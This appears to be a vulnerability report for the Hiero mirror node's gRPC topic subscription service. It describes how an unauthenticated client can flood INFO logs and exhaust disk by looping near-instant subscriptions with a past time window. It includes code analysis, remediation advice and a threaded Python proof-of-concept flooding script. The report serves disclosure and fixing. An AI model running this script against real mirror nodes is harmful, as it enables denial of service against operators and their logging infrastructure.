### Title
Unbounded INFO Log Generation via Rapid Short-Lived Topic Subscriptions (Log Flooding / Disk Exhaustion)

### Summary
Any unauthenticated client can open topic subscriptions with a past `endTime` (or `limit=1`) that complete near-instantly, each triggering an unconditional `log.info(...)` call in `TopicContext.finished()`. There is no per-client rate limit, no minimum subscription duration, and no log-rate throttle, so a tight loop of such subscriptions can generate tens of thousands of INFO log entries per second, filling disk or overwhelming log aggregation pipelines.

### Finding Description

**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`

- Line 60: `log.info("Subscribing to topic: {}", filter);` — fires on every `subscribeTopic()` call.
- Lines 88–91: `doFinally(topicContext::finished)` — unconditionally calls `finished()` on every terminal signal (complete, error, cancel).
- Lines 227–236: `TopicContext.finished()` — unconditional `log.info(...)` with no rate limiting, deduplication, or guard.

```java
void finished(SignalType signalType) {
    log.info(
            "[{}] Topic {} {} with {} messages in {} ({}/s)",
            filter.getSubscriberId(),
            signalType,
            topicId,
            count,
            stopwatch,
            rate());
}
```

**Root cause:** The `finished()` method and the subscription entry log are both unconditional `INFO`-level calls. The only concurrency control is `maxConcurrentCallsPerConnection = 5` (in `NettyProperties`, line 14), which limits *concurrent* calls per TCP connection but does not bound the *rate* of new connections or sequential subscription cycles. `TopicMessageFilter` validation (`TopicMessageFilter.java` lines 43–51) only requires `endTime > startTime` (a 1-nanosecond window is valid) and `startTime <= now`, so a subscription with a fully-past time window is accepted and completes in milliseconds.

**Exploit flow:**

1. Attacker opens *M* TCP connections to the gRPC port (no connection-rate limit exists).
2. On each connection, attacker issues 5 concurrent `subscribeTopic` RPCs with `startTime = T_past`, `endTime = T_past + 1` (1 ns window, both in the past).
3. `isComplete()` (lines 203–214) returns `true` immediately because `filter.getEndTime() < startTime` (the `TopicContext.startTime` set at `DomainUtils.now()`).
4. Each subscription terminates in <10 ms, triggering:
   - 1× `log.info("Subscribing to topic: …")` (line 60)
   - 1× `log.info(…)` in `finished()` (line 228)
   - 1× `log.info("Finished retrieving …")` in `PollingTopicMessageRetriever.onComplete()` (line 140)
5. Attacker immediately re-issues the RPC. With *M*=200 connections × 5 concurrent = 1 000 concurrent subscriptions cycling every ~10 ms → **~100 000 INFO log lines/second**.

**Why existing checks fail:**

- `maxConcurrentCallsPerConnection = 5` (NettyProperties line 14) only caps concurrency *per connection*; opening more connections trivially bypasses it.
- `TopicMessageFilter` validation (lines 43–51) enforces `endTime > startTime` but imposes no minimum window size and no minimum `limit`.
- No IP-level throttle, no global subscription-rate limiter, and no log-rate limiter exist anywhere in the gRPC stack.

### Impact Explanation
An attacker with no credentials and no on-chain cost can saturate the mirror node's log subsystem. Consequences include: disk exhaustion (causing the JVM or OS to crash/hang), loss of legitimate operational log entries, and potential cascading failure of log aggregation infrastructure (e.g., Elasticsearch, Splunk). The attack requires only network access to the gRPC port (default 5600).

### Likelihood Explanation
The attack requires no special privileges, no tokens, and no knowledge beyond the public gRPC proto definition. A single commodity machine with a standard gRPC client library can sustain the required connection rate. The attack is fully repeatable and automatable. The only practical barrier is network bandwidth, which is negligible given the small RPC payload size.

### Recommendation

1. **Rate-limit subscriptions per source IP** at the Netty/gRPC layer (e.g., using a token-bucket interceptor) before `subscribeTopic` is invoked.
2. **Enforce a minimum subscription window**: reject filters where `endTime - startTime < configurable_minimum` (e.g., 1 second) or where `endTime` is already in the past at subscription time.
3. **Downgrade or rate-limit the `finished()` log**: use `log.debug(...)` instead of `log.info(...)`, or apply a per-topic/per-subscriber log-rate limiter (e.g., Guava `RateLimiter` or SLF4J's `LoggingEventBuilder` with a rate filter).
4. **Cap total concurrent subscriptions globally** (not just per connection) via a semaphore checked in `subscribeTopic()`, returning `RESOURCE_EXHAUSTED` when the cap is reached.

### Proof of Concept

```python
import grpc
import threading
from hedera import consensus_service_pb2_grpc, consensus_service_pb2
from hedera.timestamp_pb2 import Timestamp
from hedera.basic_types_pb2 import TopicID

MIRROR_HOST = "mirror-node:5600"
TOPIC_NUM   = 1          # any valid topic
CONNECTIONS = 200
CALLS_PER   = 5          # maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.insecure_channel(MIRROR_HOST)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    while True:
        query = consensus_service_pb2.ConsensusTopicQuery(
            topicID=TopicID(topicNum=TOPIC_NUM),
            consensusStartTime=Timestamp(seconds=1, nanos=0),
            consensusEndTime=Timestamp(seconds=1, nanos=1),   # 1 ns window, fully in past
            limit=1,
        )
        try:
            list(stub.subscribeTopic(query))   # completes instantly
        except Exception:
            pass   # errors also trigger finished() + log

threads = [threading.Thread(target=flood, args=(i,), daemon=True)
           for i in range(CONNECTIONS * CALLS_PER)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```

Each iteration of the inner loop completes in <10 ms and produces ≥2 INFO log lines. At 1 000 concurrent threads this yields ~100 000 log lines/second with no authentication and no on-chain cost.